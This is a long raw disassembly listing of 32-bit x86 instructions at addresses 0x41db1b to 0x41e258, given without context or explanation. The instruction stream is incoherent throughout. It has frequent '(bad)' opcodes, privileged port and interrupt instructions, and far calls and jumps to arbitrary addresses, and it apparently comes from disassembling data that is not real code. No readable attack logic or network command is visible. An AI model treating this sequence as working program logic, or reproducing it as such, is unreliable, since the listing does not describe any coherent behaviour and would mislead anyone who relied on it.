  41db1b:	scas   eax,DWORD PTR es:[edi]
  41db1c:	jne    0x41daf4
  41db1e:	stos   BYTE PTR es:[edi],al
  41db1f:	pop    ds
  41db20:	adc    cl,BYTE PTR [eax+edi*2]
  41db23:	add    al,0x41
  41db25:	js     0x41daf1
  41db27:	add    dl,BYTE PTR [edi-0x63]
  41db2a:	test   eax,0xdbf3cacc
  41db2f:	jnp    0x41db63
  41db31:	cdq    
  41db32:	pop    ebx
  41db33:	cli    
  41db34:	dec    ecx
  41db35:	pop    ebp
  41db36:	sub    DWORD PTR [ecx+0xb],ebp
  41db39:	(bad)  
  41db3a:	addr16 pushf 
  41db3c:	xchg   esp,eax
  41db3d:	(bad)  
  41db3e:	(bad)  
  41db3f:	fisttp DWORD PTR [esp+ebx*1+0x41b3d4d]
  41db46:	das    
  41db47:	fdiv   DWORD PTR [ebx]
  41db49:	cmp    BYTE PTR [ecx-0x1d10a020],ch
  41db4f:	(bad)  
  41db50:	aad    0x7b
  41db52:	test   eax,0x255b134e
  41db57:	mov    bh,BYTE PTR [edi-0x645e490f]
  41db5d:	and    al,0x78
  41db5f:	inc    esp
  41db60:	xor    BYTE PTR [edx],ch
  41db62:	daa    
  41db63:	mov    ds:0x4afb35a7,eax
  41db68:	jmp    0xfe345857
  41db6d:	sar    DWORD PTR [esi],1
  41db6f:	mov    eax,ds:0x54d7f08d
  41db74:	fincstp 
  41db76:	lahf   
  41db77:	or     DWORD PTR [ecx+0x5cfb1f51],ebx
  41db7d:	(bad)  
  41db7f:	leave  
  41db80:	jns    0x41dbfb
  41db82:	add    eax,0x4923b153
  41db87:	lods   eax,DWORD PTR ds:[esi]
  41db88:	cli    
  41db89:	mov    esp,0xe3c0ee12
  41db8e:	adc    edi,DWORD PTR cs:[edx-0x28561328]
  41db95:	retf   
  41db96:	and    BYTE PTR [ebx+0x7ae6f5c1],ah
  41db9c:	xlat   BYTE PTR ds:[ebx]
  41db9d:	std    
  41db9e:	pusha  
  41db9f:	fs jne 0x41db6a
  41dba2:	xlat   BYTE PTR ds:[ebx]
  41dba3:	pusha  
  41dba4:	xchg   ebx,eax
  41dba5:	push   esi
  41dba6:	xor    dl,BYTE PTR [edx+ebx*1]
  41dba9:	leave  
  41dbaa:	pusha  
  41dbab:	cld    
  41dbac:	xchg   DWORD PTR [ebx],ecx
  41dbae:	cdq    
  41dbaf:	and    ebp,eax
  41dbb1:	push   edi
  41dbb2:	cmp    bl,BYTE PTR [ebp+ebx*8-0x41b7427d]
  41dbb9:	pop    es
  41dbba:	fsub   DWORD PTR [edx-0x149d1ac5]
  41dbc0:	dec    ebx
  41dbc1:	mov    dl,0x82
  41dbc3:	pop    ebx
  41dbc4:	adc    DWORD PTR [edi+edi*4],0xffffffd8
  41dbc8:	loop   0x41db95
  41dbca:	popa   
  41dbcb:	ja     0x41dbab
  41dbcd:	xor    al,0x5f
  41dbcf:	aad    0xb5
  41dbd1:	(bad)  
  41dbd2:	fbstp  TBYTE PTR [edx+0x584792ca]
  41dbd8:	aaa    
  41dbd9:	sub    al,0x35
  41dbdb:	jg     0x41dc4d
  41dbdd:	std    
  41dbde:	push   ds
  41dbdf:	fmul   DWORD PTR [edx+0x16]
  41dbe2:	sbb    DWORD PTR [ecx-0x69b1d155],ebp
  41dbe8:	retf   0xc0e2
  41dbeb:	or     al,0xbd
  41dbed:	xchg   DWORD PTR [ebp-0x34],ebx
  41dbf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbf1:	aad    0x64
  41dbf3:	out    dx,eax
  41dbf4:	cwde   
  41dbf5:	mov    al,0x60
  41dbf7:	inc    eax
  41dbf8:	sub    BYTE PTR [eax+0x4ddd4386],bh
  41dbfe:	push   edx
  41dbff:	adc    bl,BYTE PTR [ecx]
  41dc01:	xchg   esi,ecx
  41dc03:	pusha  
  41dc04:	and    edi,esp
  41dc06:	push   ss
  41dc07:	mov    bl,0x6b
  41dc09:	rcr    DWORD PTR [ecx+0x3e943213],1
  41dc0f:	inc    esi
  41dc10:	jae    0x41dbac
  41dc12:	fst    DWORD PTR [ecx+0x688412cb]
  41dc18:	jnp    0x41dbc5
  41dc1a:	div    DWORD PTR [ebx]
  41dc1c:	dec    ecx
  41dc1d:	ins    DWORD PTR es:[edi],dx
  41dc1e:	xor    bh,BYTE PTR [ebp+0x65]
  41dc21:	cld    
  41dc22:	gs mov ah,0x44
  41dc25:	dec    ecx
  41dc26:	add    eax,0xf4d4fcd
  41dc2b:	pop    ebp
  41dc2c:	adc    bl,0x18
  41dc2f:	pop    ecx
  41dc30:	or     ch,bl
  41dc32:	adc    eax,0xf7b4e603
  41dc37:	push   edi
  41dc38:	sar    bh,1
  41dc3a:	call   0xcfae:0xf7168aad
  41dc41:	mov    esp,DWORD PTR [eax+ebp*8-0x3e]
  41dc45:	dec    edi
  41dc46:	and    BYTE PTR [ebp+0x3a7f6ca4],ah
  41dc4c:	stc    
  41dc4d:	adc    DWORD PTR [eax+edi*1-0xf],ebx
  41dc51:	jp     0x41dc03
  41dc53:	test   BYTE PTR [esi+0x6],bl
  41dc56:	out    0x94,eax
  41dc58:	lea    edx,[esi-0x54]
  41dc5b:	adc    eax,0x140598d5
  41dc60:	and    eax,0xb754e95
  41dc65:	cmp    al,0xd0
  41dc67:	cmp    al,0xcd
  41dc69:	test   BYTE PTR [ecx+0x3e],bl
  41dc6c:	loopne 0x41dc9b
  41dc6e:	adc    esp,DWORD PTR [ebp-0x72c759a7]
  41dc74:	dec    esp
  41dc75:	and    al,0x42
  41dc77:	shr    ah,cl
  41dc79:	test   DWORD PTR [ecx-0x7ac6411c],edi
  41dc7f:	push   0xd
  41dc81:	aad    0x1c
  41dc83:	dec    ebx
  41dc84:	retf   
  41dc85:	sub    al,0xf6
  41dc87:	pop    ebp
  41dc88:	xchg   ebx,eax
  41dc89:	cmp    DWORD PTR [eax-0x4f5ebb41],esp
  41dc8f:	cmp    al,0xae
  41dc91:	std    
  41dc92:	fbld   TBYTE PTR ds:0xced5c892
  41dc98:	sbb    al,0xd2
  41dc9a:	mov    bh,0xcb
  41dc9c:	push   edx
  41dc9d:	inc    esi
  41dc9e:	retf   
  41dc9f:	xor    cl,BYTE PTR [esi+0x5378e031]
  41dca5:	xchg   DWORD PTR [esi-0x5023b0f0],edx
  41dcab:	cmp    DWORD PTR [edx],ebp
  41dcad:	loopne 0x41dd2b
  41dcaf:	or     DWORD PTR [eax+0x1b2e023c],esi
  41dcb5:	jp     0x41dcef
  41dcb7:	test   BYTE PTR [ebx-0x1e98b210],bh
  41dcbd:	int    0x36
  41dcbf:	pop    ss
  41dcc0:	loopne 0x41dd2a
  41dcc2:	xlat   BYTE PTR ds:[ebx]
  41dcc3:	fld    QWORD PTR [esi]
  41dcc5:	inc    esi
  41dcc6:	mov    DWORD PTR [ebp-0x7b5af79c],ecx
  41dccc:	add    bh,BYTE PTR [esi]
  41dcce:	hlt    
  41dccf:	mov    al,ds:0x2284bac2
  41dcd4:	xor    eax,0x31b7bf04
  41dcd9:	mov    edi,0xbb06f713
  41dcde:	into   
  41dcdf:	outs   dx,BYTE PTR ds:[esi]
  41dce0:	xchg   ebp,eax
  41dce1:	push   0x7cc483a
  41dce6:	pop    ds
  41dce7:	scas   eax,DWORD PTR es:[edi]
  41dce8:	stos   DWORD PTR es:[edi],eax
  41dce9:	fisubr DWORD PTR [esi+0x72]
  41dcec:	inc    ebx
  41dced:	aas    
  41dcee:	mov    dl,0x78
  41dcf0:	inc    BYTE PTR [ecx]
  41dcf2:	add    al,0x12
  41dcf4:	je     0x41dd15
  41dcf6:	in     al,dx
  41dcf7:	jbe    0x2f8f08c7
  41dcfd:	sbb    al,0x49
  41dcff:	push   ds
  41dd00:	fmul   QWORD PTR [edx-0x5a]
  41dd03:	jl     0x41dce5
  41dd05:	into   
  41dd06:	mov    ecx,fs
  41dd08:	inc    edx
  41dd09:	add    DWORD PTR [edi-0x2b],0xf22bf825
  41dd10:	xchg   esp,eax
  41dd11:	lods   eax,DWORD PTR ds:[esi]
  41dd12:	adc    dh,ch
  41dd14:	mov    bl,BYTE PTR [ebx-0x5d]
  41dd17:	jae    0x41dd27
  41dd19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd1a:	mov    edx,0x4678051c
  41dd1f:	push   esp
  41dd20:	jo     0x41dcad
  41dd22:	enter  0x7b0e,0x95
  41dd26:	pop    ds
  41dd27:	push   ds
  41dd28:	cmp    BYTE PTR [ebx+0x70],bl
  41dd2b:	add    al,0x4e
  41dd2d:	in     eax,0x0
  41dd2f:	jb     0x41dd8c
  41dd31:	mov    ds:0x45f7fff4,al
  41dd36:	xchg   ecx,eax
  41dd37:	popa   
  41dd38:	adc    BYTE PTR fs:[esi+0x26],ch
  41dd3c:	jb     0x41dd86
  41dd3e:	xchg   BYTE PTR [ebx],dh
  41dd40:	jns    0x41dd43
  41dd42:	xchg   edi,eax
  41dd43:	add    eax,0xf7cd932c
  41dd48:	adc    BYTE PTR [ebx+edx*2-0x3fae4f20],bl
  41dd4f:	les    ebx,FWORD PTR [ebx-0x36]
  41dd52:	jbe    0x41ddc5
  41dd54:	retf   
  41dd55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dd56:	push   esp
  41dd57:	inc    edi
  41dd58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd59:	shl    DWORD PTR [ebp-0x5e],0x4f
  41dd5d:	arpl   bx,bp
  41dd5f:	add    cl,BYTE PTR [eax-0xc]
  41dd62:	adc    ebx,DWORD PTR [eax+ecx*4]
  41dd65:	ss xor al,0xe5
  41dd68:	ficomp DWORD PTR [edi]
  41dd6a:	daa    
  41dd6b:	cmp    DWORD PTR [ecx],ecx
  41dd6d:	test   eax,0x9a0e4f63
  41dd72:	mov    bh,0x6e
  41dd74:	(bad)  
  41dd75:	aam    0x77
  41dd77:	shl    DWORD PTR [esi],cl
  41dd79:	jg     0x41dd03
  41dd7b:	and    DWORD PTR [eax-0x7],esi
  41dd7e:	pop    ebp
  41dd7f:	int    0x39
  41dd81:	mov    esp,0x358e09b2
  41dd86:	sbb    eax,0xd59d806
  41dd8b:	push   ds
  41dd8c:	or     DWORD PTR [esi+0x7131958a],edi
  41dd92:	add    esi,ebp
  41dd94:	or     al,0x91
  41dd96:	mov    eax,esp
  41dd98:	mov    ah,0xb6
  41dd9a:	sbb    BYTE PTR [eax-0x2456f046],dh
  41dda0:	cmp    al,0x9e
  41dda2:	sub    eax,0x4dc81155
  41dda7:	xor    al,0xc7
  41dda9:	test   BYTE PTR [edx],dh
  41ddab:	sar    DWORD PTR [eax-0x2c],cl
  41ddae:	out    dx,eax
  41ddaf:	sbb    DWORD PTR [ecx],esi
  41ddb1:	(bad)  
  41ddb2:	adc    BYTE PTR [edx],bl
  41ddb4:	pop    edi
  41ddb5:	not    BYTE PTR cs:[edx-0x27]
  41ddb9:	(bad)  
  41ddba:	pusha  
  41ddbb:	pop    edi
  41ddbc:	xchg   ebp,eax
  41ddbd:	out    dx,al
  41ddbe:	out    dx,al
  41ddbf:	mov    bh,0xf8
  41ddc1:	push   ss
  41ddc2:	lods   al,BYTE PTR ds:[esi]
  41ddc3:	pop    ebp
  41ddc4:	adc    edi,DWORD PTR [bx+di-0x3d]
  41ddc8:	sbb    al,0x98
  41ddca:	pop    ss
  41ddcb:	(bad)  
  41ddcc:	xchg   ebp,eax
  41ddcd:	mov    esi,0x25a5dcd3
  41ddd2:	push   edi
  41ddd3:	push   0x25
  41ddd5:	pop    ebp
  41ddd6:	push   es
  41ddd7:	outs   dx,DWORD PTR ds:[esi]
  41ddd8:	jmp    0x7d9e0313
  41dddd:	pop    ds
  41ddde:	mov    bl,0xb5
  41dde0:	mov    dl,0xa9
  41dde2:	rcr    esp,0xa3
  41dde5:	addr16 loopne 0x41dd88
  41dde8:	xchg   di,ax
  41ddea:	stos   BYTE PTR es:[edi],al
  41ddeb:	clc    
  41ddec:	jp     0x41dde7
  41ddee:	sub    bl,BYTE PTR [ecx]
  41ddf0:	imul   BYTE PTR [edi]
  41ddf2:	fld    QWORD PTR [edx]
  41ddf4:	sbb    al,0x5e
  41ddf6:	dec    esp
  41ddf7:	icebp  
  41ddf8:	cwde   
  41ddf9:	xor    eax,0xc15a3fa6
  41ddfe:	imul   ecx,DWORD PTR [eax],0x56
  41de01:	add    al,0x11
  41de03:	shr    BYTE PTR [ebx-0x1b],cl
  41de06:	(bad)  
  41de07:	jmp    0x41de75
  41de09:	mov    ebp,0x75b50dde
  41de0e:	or     eax,0x54748be
  41de13:	das    
  41de14:	jne    0x41de14
  41de16:	sbb    edx,DWORD PTR [ecx]
  41de18:	js     0x41ddef
  41de1a:	stc    
  41de1b:	inc    esi
  41de1c:	mov    ebx,0x48c24eef
  41de21:	xchg   ebx,eax
  41de22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de23:	sar    DWORD PTR [eax],1
  41de25:	jl     0x41de99
  41de27:	jno    0x41de43
  41de29:	adc    BYTE PTR [eax],0x5c
  41de2c:	jl     0x41ddd8
  41de2e:	xchg   ebx,eax
  41de2f:	add    BYTE PTR [edi-0x36f5080b],0xfa
  41de36:	mov    ds:0xa4348f22,eax
  41de3b:	fild   WORD PTR es:[ebx]
  41de3e:	xor    ah,bl
  41de40:	cdq    
  41de41:	cli    
  41de42:	ror    DWORD PTR [ecx+0x72],1
  41de45:	arpl   si,di
  41de47:	add    al,BYTE PTR [esi+0x1a76e92]
  41de4d:	cdq    
  41de4e:	lock jb 0x41dea2
  41de51:	sbb    eax,0x725b73b7
  41de56:	cli    
  41de57:	adc    ecx,DWORD PTR [eax-0x4a]
  41de5a:	scas   eax,DWORD PTR es:[edi]
  41de5b:	adc    dh,BYTE PTR [esi-0x4]
  41de5e:	hlt    
  41de5f:	mov    eax,0xcdf8666a
  41de64:	add    dh,BYTE PTR [edi-0x11ed3920]
  41de6a:	dec    ebx
  41de6b:	fwait
  41de6c:	push   es
  41de6d:	stc    
  41de6e:	and    edx,eax
  41de70:	icebp  
  41de71:	sti    
  41de72:	je     0x41de8b
  41de74:	repnz xchg ecx,eax
  41de76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de77:	dec    ecx
  41de78:	mov    ch,0xb4
  41de7a:	mov    ebp,0xe8a31bd3
  41de7f:	pop    esp
  41de80:	lock bound ecx,QWORD PTR [ebx-0x671df5d]
  41de87:	jmp    0x41de59
  41de89:	stos   BYTE PTR es:[edi],al
  41de8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de8b:	shl    DWORD PTR [edx],cl
  41de8d:	out    dx,eax
  41de8e:	(bad)  
  41de8f:	sti    
  41de90:	in     al,0x10
  41de92:	push   bp
  41de94:	iret   
  41de95:	or     ebp,DWORD PTR [eax+eiz*8-0x198c9649]
  41de9c:	jmp    0x41de3a
  41de9e:	xchg   ebx,eax
  41de9f:	(bad)  
  41dea0:	(bad)  
  41dea1:	cld    
  41dea2:	cmp    ah,bh
  41dea4:	jl     0x41df1f
  41dea6:	daa    
  41dea7:	not    DWORD PTR [ebx]
  41dea9:	inc    edi
  41deaa:	xchg   esi,eax
  41deab:	cdq    
  41deac:	mov    eax,ds:0x95c580ee
  41deb1:	mov    ebp,0x876d66cb
  41deb6:	loope  0x41de75
  41deb8:	inc    ebx
  41deb9:	daa    
  41deba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41debb:	bt     DWORD PTR [esp+edi*4+0x1],esi
  41dec0:	xchg   ebx,eax
  41dec1:	fucomip st,st(7)
  41dec3:	loop   0x41dedc
  41dec5:	hlt    
  41dec6:	add    ecx,DWORD PTR [ebp+0x31b4520]
  41decc:	js     0x41df4a
  41dece:	in     al,0x48
  41ded0:	push   0x98a17c43
  41ded5:	fistp  QWORD PTR [edi-0x7eac39f4]
  41dedb:	aad    0xeb
  41dedd:	mov    eax,0x69d0d1fa
  41dee2:	inc    edx
  41dee3:	lea    esi,ds:0x2bc61870
  41dee9:	push   ebp
  41deea:	mov    ebx,0xbb124e7a
  41deef:	sbb    eax,0x71e3dfa9
  41def4:	push   eax
  41def5:	rol    BYTE PTR [eax-0x5c],1
  41def8:	stos   BYTE PTR es:[edi],al
  41def9:	xlat   BYTE PTR ds:[ebx]
  41defa:	pop    ebp
  41defb:	icebp  
  41defc:	test   BYTE PTR [ecx-0x73f082d3],0xba
  41df03:	loop   0x41df20
  41df05:	mov    cl,0x29
  41df07:	or     DWORD PTR [edx-0x7b],0x76
  41df0b:	jno    0x41de91
  41df0d:	lds    ebx,FWORD PTR [edi+0x16]
  41df10:	leave  
  41df11:	or     ebp,DWORD PTR [esi+0x61f6b7b0]
  41df17:	jg     0x41ded4
  41df19:	test   BYTE PTR [ebx],al
  41df1b:	and    eax,DWORD PTR [ebx+0x6b3698e6]
  41df21:	test   eax,0xf60626c9
  41df26:	adc    ebp,DWORD PTR [ebx+eiz*1]
  41df29:	cwde   
  41df2a:	(bad)  
  41df2b:	cld    
  41df2c:	pop    ebp
  41df2d:	pop    esp
  41df2e:	mov    ebx,0xeb833a0e
  41df33:	cmp    bl,BYTE PTR [edi-0x6b]
  41df36:	add    dh,BYTE PTR [edx]
  41df38:	nop
  41df39:	das    
  41df3a:	dec    edi
  41df3b:	in     eax,dx
  41df3c:	nop
  41df3d:	mov    eax,ds:0x2709da6e
  41df42:	stc    
  41df43:	sti    
  41df44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41df45:	or     al,0xaf
  41df47:	js     0x41dfb2
  41df49:	xchg   edi,eax
  41df4a:	ds adc al,0xf8
  41df4d:	sbb    BYTE PTR [edi+esi*4+0x2],dl
  41df51:	or     DWORD PTR [edi],ebp
  41df53:	(bad)  
  41df54:	mov    dl,0xa1
  41df56:	jbe    0x41dee4
  41df58:	push   ebx
  41df59:	mov    ds:0xb05ba9cb,eax
  41df5e:	adc    al,0xec
  41df60:	iret   
  41df61:	data16 jo 0x41dfd2
  41df64:	into   
  41df65:	retf   
  41df66:	pushf  
  41df67:	pop    ebp
  41df68:	call   0xb49ee8ab
  41df6d:	dec    edi
  41df6e:	pop    ebx
  41df6f:	pop    eax
  41df70:	push   es
  41df71:	cmp    eax,0x491ea470
  41df76:	aas    
  41df77:	test   BYTE PTR [ecx+edi*1+0x442d9566],bl
  41df7e:	(bad)  
  41df7f:	push   ebx
  41df80:	push   ds
  41df81:	ss jmp 0x6670:0xe852cc20
  41df89:	cmp    BYTE PTR [edx+0x47],0x2f
  41df8d:	ret    0x1456
  41df90:	sar    DWORD PTR [esi-0x76],1
  41df93:	push   ss
  41df94:	lods   eax,DWORD PTR ds:[esi]
  41df95:	mov    ecx,0xee701582
  41df9a:	mov    ah,0x50
  41df9c:	fisubr DWORD PTR [edx]
  41df9e:	and    al,0xfb
  41dfa0:	add    al,0x63
  41dfa2:	popf   
  41dfa3:	shr    BYTE PTR [edx-0x228c2c30],0x9a
  41dfaa:	xor    DWORD PTR [ecx-0x7a],edx
  41dfad:	sub    edx,ebp
  41dfaf:	dec    edx
  41dfb0:	mov    bl,0x88
  41dfb2:	jnp    0x41dfba
  41dfb4:	gs call 0x790e3a58
  41dfba:	lahf   
  41dfbb:	mov    ebp,0x6af8e1c9
  41dfc0:	xchg   edi,eax
  41dfc1:	mov    ds:0x4b36aecc,eax
  41dfc6:	cs call 0x9df7a456
  41dfcc:	or     al,ch
  41dfce:	sbb    DWORD PTR [eax],ebx
  41dfd0:	mov    ah,0x63
  41dfd2:	mov    eax,0x76ca2753
  41dfd7:	out    dx,al
  41dfd8:	dec    esp
  41dfd9:	outs   dx,DWORD PTR ds:[esi]
  41dfda:	retf   
  41dfdb:	call   0x4ef8fab6
  41dfe0:	jne    0x41e04b
  41dfe2:	push   esp
  41dfe3:	adc    eax,0x9e1b4d6e
  41dfe8:	xor    al,0x59
  41dfea:	ja     0x41dfaa
  41dfec:	add    ch,al
  41dfee:	jns    0x41df80
  41dff0:	mov    bl,0x54
  41dff2:	pop    edi
  41dff3:	xor    BYTE PTR [edi+0x2ea1dc11],ah
  41dff9:	add    BYTE PTR [edi-0x23],al
  41dffc:	jle    0x41e00b
  41dffe:	in     al,dx
  41dfff:	call   0xc16:0x40e7d9cd
  41e006:	and    al,0x46
  41e008:	mov    bl,0x3
  41e00a:	mov    esi,0x66b6e015
  41e00f:	sahf   
  41e010:	pop    esi
  41e011:	sahf   
  41e012:	jg     0x41e081
  41e014:	jecxz  0x41e089
  41e016:	clc    
  41e017:	aad    0xdb
  41e019:	cmp    eax,0x17f8c191
  41e01e:	mov    edx,ebx
  41e020:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e021:	xchg   ebx,eax
  41e022:	jne    0x41e030
  41e024:	stc    
  41e025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e026:	dec    ecx
  41e027:	mov    esp,0x1bc3122f
  41e02c:	cmp    al,0x64
  41e02e:	addr16 sahf 
  41e030:	shr    BYTE PTR [ebp-0x5fe65f25],cl
  41e036:	sbb    al,BYTE PTR [ebx+0x5880b3cb]
  41e03c:	pusha  
  41e03d:	in     eax,0x73
  41e03f:	jnp    0x41e000
  41e041:	inc    ecx
  41e042:	clc    
  41e043:	and    ah,al
  41e045:	sbb    cl,BYTE PTR [eax+0x65]
  41e048:	sti    
  41e049:	xchg   esp,eax
  41e04a:	push   esi
  41e04b:	ss cwde 
  41e04d:	outs   dx,DWORD PTR ds:[esi]
  41e04e:	cld    
  41e04f:	dec    ecx
  41e050:	outs   dx,BYTE PTR ds:[esi]
  41e051:	inc    ebx
  41e052:	xchg   esp,eax
  41e053:	cmp    eax,0x2b5b151c
  41e058:	loop   0x41e023
  41e05a:	idiv   WORD PTR [edx+ebp*4+0xf]
  41e05f:	mov    edx,0x8094c749
  41e064:	and    BYTE PTR [bp+di-0x4c2d],bl
  41e069:	shr    ebp,0xdc
  41e06c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e06d:	icebp  
  41e06e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e06f:	push   ss
  41e070:	call   0x5230b08
  41e075:	ins    DWORD PTR es:[edi],dx
  41e076:	dec    esp
  41e077:	(bad)  
  41e078:	sub    cl,BYTE PTR [esi]
  41e07a:	mov    ds:0x8c4e0f0a,eax
  41e07f:	stc    
  41e080:	idiv   BYTE PTR [edx-0x5a]
  41e083:	scas   al,BYTE PTR es:[edi]
  41e084:	push   ds
  41e085:	imul   ecx,edx,0xffffffae
  41e088:	enter  0x8d68,0xdf
  41e08c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e08d:	arpl   WORD PTR [edi],dx
  41e08f:	adc    al,bl
  41e091:	es inc esp
  41e093:	cdq    
  41e094:	xor    eax,0x3fca5782
  41e099:	push   ecx
  41e09a:	ret    
  41e09b:	nop
  41e09c:	xchg   edi,eax
  41e09d:	xchg   DWORD PTR ds:0x3fb7c6fb,edi
  41e0a3:	(bad)  
  41e0a4:	aad    0xc5
  41e0a6:	dec    edx
  41e0a7:	add    BYTE PTR [edi+0x6280696f],0x6d
  41e0ae:	mov    cs,WORD PTR [edx-0x74759b0e]
  41e0b4:	lds    eax,FWORD PTR [eax-0x64]
  41e0b7:	aas    
  41e0b8:	shr    esi,cl
  41e0ba:	arpl   ax,sp
  41e0bc:	into   
  41e0bd:	inc    esp
  41e0be:	test   eax,0xf908b91a
  41e0c3:	fdivr  DWORD PTR [eax-0x2b23b7e0]
  41e0c9:	mov    WORD PTR gs:[esi-0x74504c95],cs
  41e0d0:	inc    esp
  41e0d1:	mov    eax,0xca7abbf4
  41e0d6:	pop    ecx
  41e0d7:	scas   eax,DWORD PTR es:[edi]
  41e0d8:	imul   edi,DWORD PTR [ebx-0x6f],0xc31c6f98
  41e0df:	rcl    DWORD PTR [ecx-0x48],1
  41e0e2:	sbb    edi,DWORD PTR [ebx]
  41e0e4:	dec    esp
  41e0e5:	dec    edx
  41e0e6:	sahf   
  41e0e7:	and    eax,0x874c9e50
  41e0ec:	sbb    DWORD PTR [ecx+ecx*2+0x77168118],edi
  41e0f3:	test   eax,0x167bafaa
  41e0f8:	lods   al,BYTE PTR ds:[esi]
  41e0f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e0fa:	or     eax,0x1248812f
  41e0ff:	mov    ds:0x335a7ccc,eax
  41e104:	repz dec edx
  41e106:	xchg   DWORD PTR [edx+0x3a564ac9],edx
  41e10c:	in     al,0x1b
  41e10e:	cmp    cl,al
  41e110:	mov    ebp,0x5ebdb10a
  41e115:	push   0xffffff9c
  41e117:	cwde   
  41e118:	jp     0x41e16b
  41e11a:	jl     0x41e0e6
  41e11c:	imul   ebx,DWORD PTR [edi],0xce36c2da
  41e122:	mov    dl,0x51
  41e124:	mov    esi,0x813a5fb4
  41e129:	mov    bh,0x4d
  41e12b:	xchg   ebx,eax
  41e12c:	adc    ah,BYTE PTR [eax+0x40]
  41e12f:	pop    ds
  41e130:	mov    ebp,0xc72afd87
  41e135:	(bad)  
  41e136:	(bad)  
  41e137:	in     al,0x4e
  41e139:	cli    
  41e13a:	push   eax
  41e13b:	dec    ecx
  41e13c:	rcl    dh,cl
  41e13e:	sahf   
  41e13f:	enter  0x2f97,0xf9
  41e143:	(bad)  
  41e144:	push   edx
  41e145:	add    al,0x25
  41e147:	push   edx
  41e148:	fiadd  DWORD PTR [edx]
  41e14a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e14b:	jl     0x41e155
  41e14d:	sub    al,0xb4
  41e14f:	in     eax,0xe5
  41e151:	mov    al,ds:0xa60dc710
  41e156:	les    esi,FWORD PTR [ebx-0x1043dd4e]
  41e15c:	sbb    DWORD PTR [eax+0x68],ebp
  41e15f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e160:	mov    bh,0x5e
  41e162:	(bad)  
  41e163:	sbb    cl,BYTE PTR [ecx-0x77]
  41e166:	mov    ch,0x1a
  41e168:	mov    eax,ds:0xdf9049b6
  41e16d:	repnz and ch,BYTE PTR [ebp-0x3d]
  41e171:	aaa    
  41e172:	test   al,0x60
  41e174:	push   ss
  41e175:	mov    ds:0xdcb92f60,al
  41e17a:	test   eax,0x1815cb42
  41e17f:	cwde   
  41e180:	mul    DWORD PTR [edi]
  41e182:	xchg   esp,eax
  41e183:	jno    0x41e182
  41e185:	popa   
  41e186:	in     eax,dx
  41e187:	int3   
  41e188:	or     al,0x87
  41e18a:	mov    ebx,0xa5fd3214
  41e18f:	stos   DWORD PTR es:[edi],eax
  41e190:	dec    esp
  41e191:	mov    edi,0x23a84e3
  41e196:	jmp    FWORD PTR [ebx-0x35326848]
  41e19c:	adc    eax,0x6ad28a00
  41e1a1:	adc    BYTE PTR [ebx+0x2b145c49],bh
  41e1a7:	int    0x66
  41e1a9:	shl    DWORD PTR [eax-0x2d35a496],0xdd
  41e1b0:	inc    edx
  41e1b1:	and    ah,BYTE PTR [ecx]
  41e1b3:	inc    edi
  41e1b4:	xchg   esp,eax
  41e1b5:	add    eax,0xb2ea1871
  41e1ba:	mov    esi,0x8267aa11
  41e1bf:	sbb    eax,0x85a87f53
  41e1c4:	dec    edi
  41e1c5:	inc    eax
  41e1c6:	sub    ch,BYTE PTR [edx]
  41e1c8:	push   ss
  41e1c9:	jb     0x41e1e5
  41e1cb:	xchg   ebp,eax
  41e1cc:	or     dh,BYTE PTR [eax]
  41e1ce:	out    0x3b,al
  41e1d0:	call   0xd0c2:0x37a6f733
  41e1d7:	inc    ecx
  41e1d8:	add    esp,ecx
  41e1da:	push   edx
  41e1db:	(bad)  
  41e1dc:	mov    esp,0x5773eee7
  41e1e1:	or     BYTE PTR [edx-0x62360317],ah
  41e1e7:	retf   0xdddd
  41e1ea:	jae    0x41e1d5
  41e1ec:	push   ecx
  41e1ed:	fwait
  41e1ee:	jecxz  0x41e1e6
  41e1f0:	int    0x56
  41e1f2:	sbb    dh,bh
  41e1f4:	arpl   WORD PTR [edi],dx
  41e1f6:	fstp   st(6)
  41e1f8:	sub    BYTE PTR [edx+0x17dafabb],ch
  41e1fe:	lods   al,BYTE PTR ds:[esi]
  41e1ff:	and    al,0x82
  41e201:	jecxz  0x41e1b0
  41e203:	popf   
  41e204:	or     esi,eax
  41e206:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e207:	out    dx,al
  41e208:	fadd   st(6),st
  41e20a:	mov    dh,0x7
  41e20c:	jne    0x41e21b
  41e20e:	add    eax,0x28bba6b1
  41e213:	ss jmp 0x8ea311cd
  41e219:	fwait
  41e21a:	cld    
  41e21b:	in     al,0x76
  41e21d:	sbb    ebx,DWORD PTR [eax+edx*1-0x49]
  41e221:	lds    esi,FWORD PTR [ebx-0x2beec193]
  41e227:	data16 jmp 0x41e298
  41e22a:	into   
  41e22b:	ins    BYTE PTR es:[edi],dx
  41e22c:	es out dx,eax
  41e22e:	mov    ds:0x779f1bd5,al
  41e233:	pop    ecx
  41e234:	push   ebx
  41e235:	inc    ebp
  41e236:	call   0xf41af73a
  41e23b:	pop    edx
  41e23c:	fiadd  DWORD PTR [esi]
  41e23e:	pop    eax
  41e23f:	je     0x41e225
  41e241:	inc    edi
  41e242:	lahf   
  41e243:	test   BYTE PTR [ecx+0x1940f0d6],cl
  41e249:	xchg   edi,eax
  41e24a:	popf   
  41e24b:	pusha  
  41e24c:	aas    
  41e24d:	cmp    cl,bl
  41e24f:	sbb    bh,dh
  41e251:	daa    
  41e252:	push   ss
  41e253:	in     eax,dx
  41e254:	pop    edx
  41e255:	xchg   DWORD PTR [eax+0x35],eax
  41e258:	sbb    cl,BYTE PTR [ecx+edi*4]
